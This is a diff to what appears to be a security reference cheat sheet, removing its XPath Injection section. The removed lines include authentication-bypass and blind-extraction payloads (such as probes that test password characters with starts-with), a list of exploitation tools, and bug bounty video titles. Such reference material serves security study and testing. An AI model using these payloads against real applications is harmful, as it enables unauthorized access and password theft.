@@ -4310,47 +4310,6 @@ while true
 end
 ```
 ---------
-# XPath Injection
-
-XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents. Similar to SQL Injection, this attack can manipulate XPath queries to gain unauthorized access to data.
-
-## Common Payloads
-```xpath
-' or '1'='1
-' or ''=''
-x' or 1=1 or 'x'='y
-/
-//
-//*
-*/*
-@*
-count(/child::node())
-x' or name()='username' or 'x'='y
-' and count(/*)=1 and '1'='1
-' and count(/@*)=1 and '1'='1
-' and count(/comment())=1 and '1'='1
-search=')] | //user/*[contains(*,'
-search=Har') and contains(../password,'c
-search=Har') and starts-with(../password,'c
-```
-
-## Tools
-- **xcat** - Automate XPath injection attacks to retrieve documents
-- **xxxpwn** - Advanced XPath Injection Tool
-- **xxxpwn_smart** - A fork of xxxpwn using predictive text
-- **xpath-blind-explorer**
-- **XmlChor** - XPath injection exploitation tool
-
-### Related Resources
-[PayloadsAllTheThings - XPath Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
-
----
-
-## Bug Bounty Videos
-1. **Extracting Password from Browser Memory Dump** using Task Manager and WinHex
-2. **Cookie Poisoning Demonstration**
-3. **XSS with HTTP Response Splitting**
-4. **JSON Attack - How to Find and Exploit JSON Vulnerabilities**
 
 # Prototype Pollution
 
